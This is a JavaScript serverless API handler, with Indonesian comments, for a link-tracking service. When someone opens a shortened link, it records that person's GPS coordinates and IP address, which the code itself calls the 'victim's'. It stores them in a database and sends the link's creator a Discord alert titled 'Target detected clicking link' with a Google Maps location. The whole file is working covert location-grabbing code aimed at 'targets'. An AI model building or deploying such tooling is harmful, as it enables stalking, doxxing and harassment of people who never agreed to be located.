import { createClient } from '@supabase/supabase-js';

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);

// Fungsi untuk mengirim DM laporan lengkap ke Discord
async function sendLogToDiscord(userId, targetUrl, latitude, longitude, ipAddress) {
  const botToken = process.env.DISCORD_BOT_TOKEN;
  if (!botToken || !userId) return;

  try {
    // 1. Buka jalur DM dengan user pembuat link
    const dmChannelRes = await fetch('https://discord.com/api/v10/users/@me/channels', {
      method: 'POST',
      headers: {
        'Authorization': `Bot ${botToken}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ recipient_id: userId })
    });

    const dmChannel = await dmChannelRes.json();
    if (!dmChannel.id) return;

    // 2. Format Google Maps link jika GPS berhasil didapat
    let locationInfo = "❌ GPS Ditolak / Tidak Tersedia";
    if (latitude && longitude) {
      locationInfo = `[Buka di Google Maps](https://www.google.com/maps?q=${latitude},${longitude})\n*(Lat: ${latitude}, Lon: ${longitude})*`;
    }

    // 3. Kirim pesan embed ke DM Discord
    await fetch(`https://discord.com/api/v10/channels/${dmChannel.id}/messages`, {
      method: 'POST',
      headers: {
        'Authorization': `Bot ${botToken}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        embeds: [{
          title: "🎯 Target Terdeteksi Mengklik Link!",
          color: 16711680, // Warna merah (alert)
          fields: [
            { name: "Target URL", value: targetUrl, inline: false },
            { name: "Lokasi GPS", value: locationInfo, inline: false },
            { name: "IP Address", value: ipAddress || "Unknown", inline: true }
          ],
          timestamp: new Date().toISOString()
        }]
      })
    });
  } catch (err) {
    console.error("Discord Log DM Error:", err);
  }
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { short_id, latitude, longitude } = req.body;

  if (!short_id) {
    return res.status(400).json({ error: "Missing short_id" });
  }

  try {
    // Ambil IP address korban dari header Vercel
    const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // 1. Cari data link berdasarkan short_id untuk tahu target_url dan user_id pembuatnya
    const { data: linkData, error: linkError } = await supabase
      .from('links')
      .select('*')
      .eq('short_id', short_id)
      .single();

    if (linkError || !linkData) {
      return res.status(404).json({ error: "Link not found" });
    }

    // 2. Simpan log klik/lokasi ke database Supabase (pastikan tabel location_logs sudah ada)
    await supabase
      .from('location_logs')
      .insert([{
        short_id: short_id,
        user_id: linkData.user_id,
        latitude: latitude || null,
        longitude: longitude || null,
        ip_address: ipAddress
      }]);

    // 3. Kirim DM laporan ke Discord pembuat link
    sendLogToDiscord(linkData.user_id, linkData.target_url, latitude, longitude, ipAddress);

    return res.status(200).json({ success: true });

  } catch (err) {
    console.error("API Log Error:", err);
    return res.status(500).json({ error: "Internal server error" });
  }
}